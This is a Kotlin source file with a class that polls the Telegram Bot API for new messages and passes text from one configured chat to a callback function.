package com.service.dinamic.telegram

import kotlinx.coroutines.*
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

class TelegramCommandListener(
    private val botToken: String,
    private val chatId: String,
    private val onCommand: (String) -> Unit
) {
    private var lastUpdateId: Long = 0
    private var isRunning = false

    fun startListening() {
        isRunning = true
        CoroutineScope(Dispatchers.IO).launch {
            while (isRunning) {
                try {
                    val url = URL("https://api.telegram.org/bot$botToken/getUpdates?offset=${lastUpdateId + 1}")
                    val connection = url.openConnection() as HttpURLConnection
                    connection.requestMethod = "GET"
                    connection.connectTimeout = 10000
                    connection.readTimeout = 10000

                    val response = connection.inputStream.bufferedReader().readText()
                    val json = JSONObject(response)
                    val result = json.getJSONArray("result")

                    for (i in 0 until result.length()) {
                        val update = result.getJSONObject(i)
                        lastUpdateId = update.getLong("update_id")
                        val message = update.optJSONObject("message") ?: continue
                        val fromChatId = message.getJSONObject("chat").getLong("id").toString()
                        val text = message.optString("text", "")

                        if (fromChatId == chatId) {
                            onCommand(text)
                        }
                    }
                } catch (e: Exception) {
                    e.printStackTrace()
                }
                delay(2000)
            }
        }
    }

    fun stopListening() {
        isRunning = false
    }
} 